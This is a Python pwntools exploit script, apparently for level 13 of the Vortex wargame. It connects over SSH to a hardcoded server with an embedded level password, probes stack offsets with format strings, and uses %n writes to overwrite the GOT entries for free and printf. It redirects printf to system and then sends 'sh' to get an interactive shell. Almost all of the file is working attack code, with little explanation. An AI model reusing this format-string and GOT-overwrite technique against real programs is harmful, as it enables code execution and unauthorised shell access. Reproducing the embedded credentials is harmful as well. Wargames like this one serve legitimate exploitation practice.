from pwn import *
from random import randint
from time import sleep
import uuid

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None
DEBUG = False

def pad(s, slen):
    return s + b"X" * (slen - len(s))


def connect(level, password, init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_download_paths(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex" + level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    load_downloaded_files()
    LOCAL = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex" + level
    return s


# function of local testing vm
def connect_to_local(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    global local_dir
    if remote:
        connect(level, password)
    else:
        compose_download_paths(level)
        load_downloaded_files()
    s = ssh("kali", "127.0.0.1", keyfile="/home/kali/.ssh/id_rsa", cache=True)
    CWD = local_dir + "/vortex"
    BINARY_PATH = CWD + "/vortex" + level
    LOCAL = True
    return s


def load_downloaded_files():
    global elf
    global libc
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"


def compose_download_paths(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"
    log.info(f"cloned_binary: {local_binary}")


def goto_bash(s, before_func=None, menu_func=None, execute=None):
    done = "0"
    while done == "0":
        if before_func:
            before_func()
        sh = s.process(["sh"])
        if execute:
            sh.sendline(execute)
        sh.interactive()
        done = input("done with sh, done?").replace("\n", "")
        if done == "2":
            menu_func()


def upload(s, content, remote_path):
    temp_path = "/tmp/" + str(uuid.uuid4())
    write(temp_path, content)
    s.upload(temp_path, remote_path)
    rm = process(["rm", "-rf", temp_path])
    rm.recvall()


def append_to_remote_file(s, content, remote_path):
    temp_path = "/tmp/" + str(uuid.uuid4())
    s.download(remote_path, temp_path)
    old = read(temp_path)
    # new = old + b"\n" + content
    new = old + content
    write(temp_path, new)
    s.upload(temp_path, remote_path)
    rm = process(["rm", "-rf", temp_path])
    rm.recvall()


gdb_script = '''
set follow-fork-mode child
set disassembly-flavor intel   
alias gil = disassemble

#alias gili = x/2i
#alias gilr = 'x/2wx $ebp'

unset env
show env

# break at main
b *main
# run wrapper with symlink as arg, pipe input later into forked vortex process
r `cat /tmp/docgil-raw` < /tmp/docgil

b *execve
c
si
si
del
break *main

c
# now in main from vortex prog
# calling fgets
b *0x080485bf
b *exit
b *printf
# free plt
b *0x8048420


c
# now in fgets
# finish
# now in vuln before free 


# echo "got of free:"
# x/1wx 0x0804a010
# # at vuln
# b *0x08048593
# 
# 
# c
# c
# c
# si
# finish
# 
# shell echo "buf:"
# x/s 0x804c5e0



# # char checking 
# break *0x080485f7
# commands
# shell echo "checking char at index"
# i r edx
# shell echo "press c to continue"
# end
# c
# brings us to char checking breakpoint
'''

s = connect_to_local("13", "jMyg12=nB", remote=False)
# s = connect("13", "jMyg12=nB")
cmd = "gdb -x /tmp/gdb /vortex/vortex13"
wrapper_path = local_dir + "/vortex/wrapper"
remote_payload_path = "/tmp/docgil-raw"
remote_format_payload_path = "/tmp/docgil"
if LOCAL:
    remote_gdb_script_path = local_dir + "/vortex/gdb.script"
else:
    remote_gdb_script_path = "/tmp/gdb"

vuln_start_adr = 0x08048593
free_got = 0x0804a010
printf_got = 0x804a00c
system_adr = 0xf7e0b040
fs_payload_size = 0x13
reduced_fs_payload_size = 0x12

log.info(
    "############################################################################################################################################################")
log.info("# Init payload symlink file")
log.info(
    "############################################################################################################################################################")
upload(s, gdb_script, remote_gdb_script_path)

symlink = None


def to_ascii_bytes(number):
    return bytes(str(number), "utf-8")


def cleanup():
    s.process(["rm", symlink])


def init_and_upload_payload(payload):
    global symlink
    symlink = payload
    s.set_working_directory(bytes(CWD, "utf-8"))
    s.ln(['-s', BINARY_PATH, symlink])
    upload(s, payload, remote_payload_path)


log.info(
    "############################################################################################################################################################")
log.info("# find hammerlen")
log.info(
    "############################################################################################################################################################")

payload = b""
payload += b"A"
payload += b"B"
payload += pack(free_got, 32)
payload += pack(printf_got, 32)
payload += pack(printf_got, 32)

payload += pack(printf_got+2, 32)
payload += pack(printf_got+2, 32)
payload += pack(printf_got+2, 32)
payload += b"DDD"

init_and_upload_payload(payload)


def execute():
    return s.process(["env", "-i", "setarch", "-R", wrapper_path, symlink])


def execute_format_payload_peek(i):
    log.info(f"i: {i}")
    f_payload = b""
    f_payload += b"%" + to_ascii_bytes(i) + b"$p"
    f_payload += b"."
    f_payload += b"%" + to_ascii_bytes(i+1) + b"$p"
    f_payload = pad(f_payload, fs_payload_size)

    log.info(f"f_payload: {f_payload}")

    io = execute()
    io.send(f_payload)
    r = io.recvall()
    log.info(f"r: {r}")
    return r


def find_off_until_payload(target_value):
    for i in range(1500):
        r = execute_format_payload_peek(i)
        log.info(f"pack(free_got, 32): {pack(free_got, 32,endianness='big')}")
        # free got
        if r.startswith(target_value):
            log.info(f"found index, start of buf at {i}")
            return i


# off_until_payload = find_off_until_payload(b"0x804a010")
# always stays the same (aslr disabled)
off_until_payload = 119
# off_until_payload = 118
# exit(1)
log.info(
    "############################################################################################################################################################")
log.info("# overwrite free's got to point to vuln")
log.info(
    "############################################################################################################################################################")

# allowed = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%.$\n"
# a = []
# for c in allowed:
#     a.append(ord(c))
# print(a)


# %2044x%10$hn%38912x%11$hn


format_payload = b""
format_payload += b"%"+to_ascii_bytes(
    0x08048593
    # 134514067
)+b"x"

format_payload += b"%" + to_ascii_bytes(
    off_until_payload
) + b"$n"
if DEBUG:
    format_payload = pad(format_payload, fs_payload_size-1)
else:
    format_payload = pad(format_payload, fs_payload_size)

log.info(f"format_payload: {format_payload}")
log.info(f"format_payload len: {len(format_payload)}")


upload(s, format_payload, remote_format_payload_path)

io = execute()
io.send(format_payload)
r = io.recv()
log.info("done receiving")

log.info("############################################################################################################################################################")
log.info("# update printf got to system 1")
log.info("############################################################################################################################################################")
'''
%134514067x%118$nXX
%4158697536x%119$nX
'''

system_adr_first_two_bytes = 0x0b040
system_adr_last_two_bytes = 0xf7e0
format_payload = b""
format_payload += b"%"+to_ascii_bytes(
    system_adr_first_two_bytes
)+b"x"

format_payload += b"%" + to_ascii_bytes(
    off_until_payload+2
) + b"$n"

format_payload = pad(format_payload, fs_payload_size)

log.info(f"format_payload2: {format_payload}")
log.info(f"format_payload2 len: {len(format_payload)}")

append_to_remote_file(s, format_payload, remote_format_payload_path)


io.send(format_payload)
r = io.recv()
log.info("done receiving")


log.info("############################################################################################################################################################")
log.info("# update printf to system 2")
log.info("############################################################################################################################################################")

format_payload = b""
format_payload += b"%"+to_ascii_bytes(
    system_adr_last_two_bytes
)+b"x"

format_payload += b"%" + to_ascii_bytes(
    off_until_payload+4
) + b"$n"

format_payload = pad(format_payload, fs_payload_size)

log.info(f"format_payload2: {format_payload}")
log.info(f"format_payload2 len: {len(format_payload)}")

append_to_remote_file(s, format_payload, remote_format_payload_path)


io.send(format_payload)
r = io.recv()
log.info("done receiving")



log.info("############################################################################################################################################################")
log.info("# send /bin/sh to execute shell")
log.info("############################################################################################################################################################")


format_payload = pad(b"sh\n", fs_payload_size)
append_to_remote_file(s, format_payload, remote_format_payload_path)


io.send(format_payload)
io.interactive()
